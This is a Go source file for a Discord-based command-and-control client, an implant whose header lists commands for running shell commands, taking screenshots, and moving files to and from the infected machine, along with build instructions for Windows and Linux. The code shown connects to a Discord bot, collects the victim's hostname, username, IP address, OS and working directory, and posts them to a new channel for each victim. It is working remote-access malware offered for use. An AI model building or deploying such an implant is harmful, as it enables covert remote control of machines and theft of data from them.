// Discord C2
// William Moody
// 08.12.2022

// 🏃‍♂️ <command>      - Run the given command (Windows: cmd.exe, Other: bash)
// 📸                - Take a screenshot
// 👇 <path>         - Download the given file (Less than 8MB)
// ☝️ <path> *attach - Upload the attached file (Less than 8MB)
// 💀                - Kill the process

// Linux   - GOOS=linux GOARCH=amd64 go build client.go
// Windows - GOOS=windows GOARCH=amd64 go build client.go

package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"os/user"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

func main() {
	loadEnvFile(".env")
	guildID = os.Getenv("DISCORD_GUILD_ID")
	token := os.Getenv("DISCORD_BOT_TOKEN")
	if token == "" || guildID == "" {
		return
	}
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		// Error creating Discord session
		return
	}

	// Handler for CreateMessage events
	dg.AddHandler(handler)
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	err = dg.Open()
	if err != nil {
		// Error opening connection
		return
	}

	// Create new channel
	rand.Seed(time.Now().UnixNano())
	currentUser, _ := user.Current()
	hostname, _ := os.Hostname()
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	ipStr := localAddr.IP.String()
	sessionId := fmt.Sprintf("%s | %s | %s", hostname, currentUser.Username, ipStr)
	cwd, _ := os.Getwd()
	var categoryName string
	switch runtime.GOOS {
	case "windows":
		categoryName = "Windows"
	case "linux":
		categoryName = "Linux"
	case "darwin":
		categoryName = "Mac"
	default:
		categoryName = "Other"
	}
	categoryID, err := getOrCreateCategory(dg, categoryName)
	if err != nil {
		return
	}
	channelName := fmt.Sprintf("%s-%s-%s",
		strings.ToLower(hostname),
		strings.ToLower(currentUser.Username),
		strings.ReplaceAll(ipStr, ".", "-"),
	)
	c, err := dg.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
		Name:     channelName,
		Type:     discordgo.ChannelTypeGuildText,
		ParentID: categoryID,
	})
	if err != nil {
		return
	}
	myChannelId = c.ID

	// Send first message with basic info (and pin it)
	firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n**IP**: %s\n**User**: %s\n**Hostname**: %s\n**OS**: %s\n**CWD**: %s", sessionId, localAddr.IP, currentUser.Username, hostname, runtime.GOOS, cwd)
	m, _ := dg.ChannelMessageSend(myChannelId, firstMsg)
	dg.ChannelMessagePin(myChannelId, m.ID)

	// Bot is now running (CTRL+C to quit)
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	dg.Close()
}
